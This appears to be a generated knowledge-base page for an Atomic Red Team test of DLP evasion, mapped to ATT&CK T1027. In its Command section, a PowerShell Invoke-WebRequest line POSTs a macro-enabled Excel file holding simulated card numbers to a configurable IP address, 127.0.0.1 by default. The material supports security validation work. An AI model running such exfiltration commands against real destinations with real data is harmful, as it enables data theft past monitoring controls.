---
atomic_guid: "e2d85e66-cb66-4ed7-93b1-833fc56c9319"
title: "DLP Evasion via Sensitive Data in VBA Macro over HTTP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1027"
attack_technique_name: "Obfuscated Files or Information"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "e2d85e66-cb66-4ed7-93b1-833fc56c9319"
  - "DLP Evasion via Sensitive Data in VBA Macro over HTTP"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# DLP Evasion via Sensitive Data in VBA Macro over HTTP

Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.

## Metadata

- Atomic GUID: e2d85e66-cb66-4ed7-93b1-833fc56c9319
- Technique: T1027: Obfuscated Files or Information
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1027/T1027.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1027-obfuscated_files_or_information|T1027]]

## Input Arguments

### input_file

- description: Path of the XLSM file
- type: path
- default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm

### ip_address

- description: Destination IP address
- type: string
- default: 127.0.0.1

## Executor

- name: powershell

### Command

```powershell
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.yaml)
